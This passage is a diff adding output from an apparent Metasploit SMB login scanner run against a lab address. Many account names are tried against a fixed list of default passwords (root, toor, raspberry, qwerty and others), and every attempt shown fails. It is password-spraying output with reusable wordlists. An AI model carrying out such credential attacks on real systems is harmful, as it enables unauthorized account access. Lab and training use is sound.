@@ -1730,3 +1730,1736 @@ msf6 auxiliary(scanner/smb/smb_login) > run
 [-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:admin',
 [-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:administrator',
 [-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\josebyr:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juanitaram:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\juliocra:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kayhar:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kellyjen:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kittymar:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\kristinfre:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahbur:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\leahlar:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lenamoo:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\lesarog:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maegut:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\marjorieada:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:password',
